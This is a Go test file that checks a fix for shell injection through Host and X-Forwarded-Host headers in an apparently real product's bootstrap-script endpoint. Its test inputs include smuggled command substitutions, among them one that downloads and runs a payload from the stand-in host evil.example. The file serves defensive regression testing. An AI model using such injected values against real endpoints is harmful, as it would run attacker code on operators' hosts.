package main

// bootstrap_host_injection_test.go — SEC-BOOTSTRAP-HOST-1, end to end.
//
// internal/bootstrap/hostsafety_test.go pins the validator and the renderers.
// These gates drive the REAL handlers through a REAL net/http server, because
// the defect lived in the seam between them: the handler read r.Host and handed
// it straight to a template, and only a live server can produce the r.Host a
// crafted Host header actually yields (httptest.NewRequest lets a test set any
// string, including ones the wire could never deliver — which would make the
// gate prove less than it claims).
//
// Verified FAILING against the pre-fix tree (unvalidated BaseURL +
// `CP_BASE="{{.CPBase}}"`), where the served script carried the attacker's
// `$( … )` verbatim into a document the product tells operators to pipe into
// `sudo bash`.

import (
	"bufio"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

// bootstrapTestServer stands the real bootstrap router up on a loopback
// listener with a freshly minted enrollment token, and returns the token plus a
// function that issues a raw GET carrying an arbitrary Host header.
func bootstrapTestServer(t *testing.T) (token string, get func(path, host string, extra ...string) (int, string)) {
	t.Helper()

	origStore := globalClusterStore
	t.Cleanup(func() { globalClusterStore = origStore })
	globalClusterStore = newTestClusterStore(t)

	origTrust := trustForwardedHeaders
	t.Cleanup(func() { trustForwardedHeaders = origTrust })

	// A ready cluster CA, so the compose handler reaches the renderer instead
	// of short-circuiting on a missing fingerprint — without it the compose
	// gate below would pass for the wrong reason.
	origCA := globalClusterCA
	t.Cleanup(func() { globalClusterCA = origCA })
	globalClusterCA = &clusterCA{}
	if err := globalClusterCA.InitOrLoad(t.TempDir()); err != nil {
		t.Fatalf("InitOrLoad cluster CA: %v", err)
	}

	tok, err := globalClusterStore.GenerateToken("dp-", "", "admin", time.Hour)
	if err != nil {
		t.Fatalf("GenerateToken: %v", err)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/api/cluster/bootstrap/", apiBootstrapRouter)
	srv := &http.Server{Handler: mux, ReadHeaderTimeout: 5 * time.Second}
	ln, err := (&net.ListenConfig{}).Listen(t.Context(), "tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	go srv.Serve(ln) //nolint:errcheck // Serve always returns on Close
	t.Cleanup(func() { _ = srv.Close() })

	get = func(path, host string, extra ...string) (int, string) {
		t.Helper()
		conn, err := (&net.Dialer{}).DialContext(t.Context(), "tcp", ln.Addr().String())
		if err != nil {
			t.Fatalf("dial: %v", err)
		}
		defer conn.Close() //nolint:errcheck // test connection
		_ = conn.SetDeadline(time.Now().Add(5 * time.Second))

		req := "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\n"
		for _, h := range extra {
			req += h + "\r\n"
		}
		req += "Connection: close\r\n\r\n"
		if _, err := io.WriteString(conn, req); err != nil {
			t.Fatalf("write: %v", err)
		}

		br := bufio.NewReader(conn)
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			// A Host the server refuses at the protocol layer never reaches a
			// handler; report it as a hard rejection rather than failing.
			return 0, ""
		}
		defer resp.Body.Close() //nolint:errcheck // test response
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		return resp.StatusCode, string(body)
	}
	return tok, get
}

// TestSECBootstrapHost1_ScriptRefusesAnInjectedHost is the primary defect gate.
//
// `$`, `(` and `)` all pass net/http's Host-header validation, and a
// double-quoted shell word performs command substitution, so before the fix
// this request returned 200 with an executable payload inside CP_BASE.
func TestSECBootstrapHost1_ScriptRefusesAnInjectedHost(t *testing.T) {
	tok, get := bootstrapTestServer(t)

	for _, host := range []string{
		"cp.example.com$(id)",
		"cp.example.com$(curl$IFS-sf$IFShttp://evil.example/p;sh)",
		"cp.example.com;id",
		"cp.example.com'",
	} {
		status, body := get("/api/cluster/bootstrap/"+tok, host)
		if status == 0 {
			continue // rejected below the handler — also fail-closed
		}
		if status == http.StatusOK {
			t.Errorf("Host %q: served a 200 bootstrap script; body:\n%s", host, body)
			continue
		}
		if status != http.StatusBadRequest {
			t.Errorf("Host %q: status = %d, want 400", host, status)
		}
		if strings.Contains(body, "$(") || strings.Contains(body, "#!/bin/bash") {
			t.Errorf("Host %q: refusal body leaked script/payload bytes: %q", host, body)
		}
	}
}

// TestSECBootstrapHost1_ComposeRefusesAnInjectedHost covers the second artifact.
func TestSECBootstrapHost1_ComposeRefusesAnInjectedHost(t *testing.T) {
	tok, get := bootstrapTestServer(t)

	// CONTROL first: with a ready cluster CA and a plain authority the compose
	// document must still be served, so the refusal below cannot pass because
	// the endpoint is simply broken.
	status, body := get("/api/cluster/bootstrap/"+tok+"/compose", "cp.example.com:9090")
	if status != http.StatusOK {
		t.Fatalf("legitimate compose request: status = %d, want 200 (body %q)", status, body)
	}
	if !strings.Contains(body, "ENROLL_URL=culvert://enroll/") {
		t.Fatalf("compose document is missing the enrollment URL:\n%s", body)
	}

	status, body = get("/api/cluster/bootstrap/"+tok+"/compose", "cp.example.com$(id):9090")
	if status == http.StatusOK {
		t.Fatalf("served a 200 compose document for an injected Host; body:\n%s", body)
	}
	if status != 0 && status != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", status)
	}
}

// TestSECBootstrapHost1_ForwardedHostIsUnconstrained pins the worse half:
// X-Forwarded-Host is an ordinary header, so net/http applies no host-shaped
// validation to it at all and quotes/backticks get through. On a
// trustForwardedHeaders deployment that is unconstrained injection.
func TestSECBootstrapHost1_ForwardedHostIsUnconstrained(t *testing.T) {
	tok, get := bootstrapTestServer(t)
	trustForwardedHeaders = true

	for _, fwd := range []string{`evil.example.com";id;"`, "evil.example.com`id`", "evil.example.com$(id)"} {
		status, body := get("/api/cluster/bootstrap/"+tok, "cp.example.com", "X-Forwarded-Host: "+fwd)
		if status == http.StatusOK {
			t.Errorf("X-Forwarded-Host %q: served a 200 bootstrap script; body:\n%s", fwd, body)
		}
	}
}

// TestSECBootstrapHost1_LegitimateHostsStillServe is the CONTROL. The cheapest
// way to pass every gate above is to refuse every request, which would remove
// one-click DP enrolment from the product; this proves the endpoint still works
// for the authorities a real Control Plane presents, and that the values it
// interpolates are single-quoted.
func TestSECBootstrapHost1_LegitimateHostsStillServe(t *testing.T) {
	tok, get := bootstrapTestServer(t)

	for _, host := range []string{"cp.example.com", "cp.example.com:9090", "10.0.0.7:9090", "[::1]:9090", "localhost:9090"} {
		status, body := get("/api/cluster/bootstrap/"+tok, host)
		if status != http.StatusOK {
			t.Errorf("Host %q: status = %d, want 200 — the fix must not refuse a real Control Plane", host, status)
			continue
		}
		if !strings.Contains(body, "#!/bin/bash") {
			t.Errorf("Host %q: body is not the install script", host)
		}
		if !strings.Contains(body, "CP_BASE='") || !strings.Contains(body, "TOKEN_PATH='") {
			t.Errorf("Host %q: script no longer single-quotes its interpolated values", host)
		}
		if strings.Contains(body, `CP_BASE="`) || strings.Contains(body, `TOKEN_PATH="`) {
			t.Errorf("Host %q: script re-introduced a double-quoted interpolation", host)
		}
	}
}

// TestSECBootstrapHost1_RefusalIsCountedAndSaysNothing pins the observability
// half: an operator needs to know the surface is refusing, and the caller must
// not be told which byte gave it away.
func TestSECBootstrapHost1_RefusalIsCountedAndSaysNothing(t *testing.T) {
	tok, get := bootstrapTestServer(t)

	before := bootstrapHostRefusedCount()
	status, body := get("/api/cluster/bootstrap/"+tok, "cp.example.com$(id)")
	if status != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", status)
	}
	if got := bootstrapHostRefusedCount(); got <= before {
		t.Fatalf("bootstrapHostRefused did not move: %d → %d", before, got)
	}
	if strings.Contains(body, "$(") || strings.Contains(body, "cp.example.com") {
		t.Fatalf("refusal echoed the caller's authority back: %q", body)
	}
}

// TestSECBootstrapHost1_TokenIsCheckedBeforeTheHost pins the ORDER. The refusal
// path logs and counts, so a caller with no token must not be able to drive it:
// an unknown token is a 404 whatever the Host says.
func TestSECBootstrapHost1_TokenIsCheckedBeforeTheHost(t *testing.T) {
	_, get := bootstrapTestServer(t)

	before := bootstrapHostRefusedCount()
	status, _ := get("/api/cluster/bootstrap/notatoken", "cp.example.com$(id)")
	if status != http.StatusNotFound {
		t.Fatalf("status = %d, want 404 — the token must be checked before the host", status)
	}
	if got := bootstrapHostRefusedCount(); got != before {
		t.Fatalf("a tokenless caller moved the refusal counter: %d → %d", before, got)
	}
}

// TestSECBootstrapHost1_RefusalCounterIsOnMetrics pins the operator surface:
// the refusal is only actionable if it is scrapeable. A counter is emitted
// unconditionally at 0 — zero is unambiguous for a counter, unlike the
// conditional gauges beside it.
func TestSECBootstrapHost1_RefusalCounterIsOnMetrics(t *testing.T) {
	origTok := metricsToken
	t.Cleanup(func() { metricsToken = origTok })
	metricsToken = ""

	w := httptest.NewRecorder()
	handleMetrics(w, httptest.NewRequestWithContext(t.Context(), http.MethodGet, "/metrics", http.NoBody))
	out := w.Body.String()
	for _, want := range []string{
		"# TYPE culvert_bootstrap_host_refused_total counter",
		"culvert_bootstrap_host_refused_total ",
		"# TYPE culvert_bootstrap_token_unusable_total counter",
		"culvert_bootstrap_token_unusable_total ",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("/metrics is missing %q", want)
		}
	}
}

// TestSECBootstrapHost1_MalformedStoredTokenIsNotAnEmpty200 pins the Codex P2
// finding on this PR: TokenExists proves only that the token's SHA-256 hash is
// in the store, so a store that was hand-edited, restored from a legacy format
// or corrupted can admit a plaintext the renderer refuses.
//
// The renderer's refusal is correct and would have landed AFTER the 200 and its
// headers, leaving the caller with an empty success — and `curl … | sudo bash`
// silently doing nothing, which is the worst way for a provisioning step to
// fail because it looks like it worked. The handler now decides before the
// response is committed.
func TestSECBootstrapHost1_MalformedStoredTokenIsNotAnEmpty200(t *testing.T) {
	_, get := bootstrapTestServer(t)

	// URL-safe and slash-free, so it clears the path checks, but not a token
	// this appliance would ever mint (base64url is [A-Za-z0-9-_]).
	beforeHost := bootstrapHostRefusedCount()
	const bad = "tok.bad"
	globalClusterStore.mu.Lock()
	globalClusterStore.st.Tokens[hashToken(bad)] = &EnrollToken{
		TokenHash: hashToken(bad),
		ExpiresAt: time.Now().Add(time.Hour),
		CreatedAt: time.Now(),
		CreatedBy: "test",
	}
	globalClusterStore.mu.Unlock()

	for _, path := range []string{
		"/api/cluster/bootstrap/" + bad,
		"/api/cluster/bootstrap/" + bad + "/compose",
	} {
		status, body := get(path, "cp.example.com:9090")
		if status == http.StatusOK {
			t.Errorf("%s: 200 for a token the renderer refuses (body %d bytes) — an empty success is "+
				"the failure mode this gate exists for", path, len(body))
			continue
		}
		if status != http.StatusInternalServerError {
			t.Errorf("%s: status = %d, want 500 (the token IS in the store, so 404 would send the "+
				"operator to mint another one that fails the same way)", path, status)
		}
		if strings.Contains(body, "#!/bin/bash") || strings.Contains(body, "services:") {
			t.Errorf("%s: refusal body carries artifact bytes: %q", path, body)
		}
	}

	if got := bootstrapHostRefusedCount(); got != beforeHost {
		t.Errorf("a malformed-token refusal moved the HOST counter (%d → %d) — the two refusals point at "+
			"different operator actions and must not share a series", beforeHost, got)
	}
	if got := bootstrapTokenUnusableCount(); got < 2 {
		t.Errorf("culvert_bootstrap_token_unusable_total = %d after two refusals, want >= 2", got)
	}

	// CONTROL: a well-formed token in the same store still serves.
	good, err := globalClusterStore.GenerateToken("dp-", "", "admin", time.Hour)
	if err != nil {
		t.Fatalf("GenerateToken: %v", err)
	}
	if status, _ := get("/api/cluster/bootstrap/"+good, "cp.example.com:9090"); status != http.StatusOK {
		t.Fatalf("well-formed token: status = %d, want 200", status)
	}
}

// TestSECBootstrapHost1_ComposeRefusesAnUnpinnedEnrollmentURL pins the second
// hole SEC-BOOTSTRAP-HOST-1 closed, which until now was only implied by
// SafeEnrollURL's grammar: with no cluster CA there is no fingerprint, so the
// enrollment URL would carry an empty `ca-fp=sha256:` and a fresh DP node would
// trust whatever answers at that address.
//
// This is also the behaviour that exposed a hidden order dependency in
// TestUIAuthMiddleware_ClusterBootstrapIsTokenAuthed, which had been relying on
// whatever cluster CA an earlier test left in the global (caught by the
// determinism gate at seed 1790033347947695463). Pinning it here means a revert
// to serving the unpinned document fails a gate that names the reason, instead
// of resurfacing as someone else's shuffle-order flake.
func TestSECBootstrapHost1_ComposeRefusesAnUnpinnedEnrollmentURL(t *testing.T) {
	tok, get := bootstrapTestServer(t)

	// CONTROL first: with the CA the helper installed, compose serves.
	if status, _ := get("/api/cluster/bootstrap/"+tok+"/compose", "cp.example.com:9090"); status != http.StatusOK {
		t.Fatalf("with a cluster CA: status = %d, want 200", status)
	}

	// Now a Control Plane with no cluster CA: no fingerprint to pin.
	globalClusterCA = &clusterCA{} // restored by bootstrapTestServer's cleanup

	status, body := get("/api/cluster/bootstrap/"+tok+"/compose", "cp.example.com:9090")
	if status == http.StatusOK {
		t.Fatalf("served a compose document with no CA fingerprint to pin; body:\n%s", body)
	}
	if status != http.StatusServiceUnavailable {
		t.Fatalf("status = %d, want 503", status)
	}
	if strings.Contains(body, "services:") || strings.Contains(body, "ENROLL_URL") {
		t.Fatalf("refusal body carries compose bytes: %q", body)
	}

	// The script path does not depend on the CA and must keep working — the
	// cheapest wrong fix is to refuse both.
	if status, _ := get("/api/cluster/bootstrap/"+tok, "cp.example.com:9090"); status != http.StatusOK {
		t.Fatalf("script path: status = %d, want 200 — it does not need a cluster CA", status)
	}
}
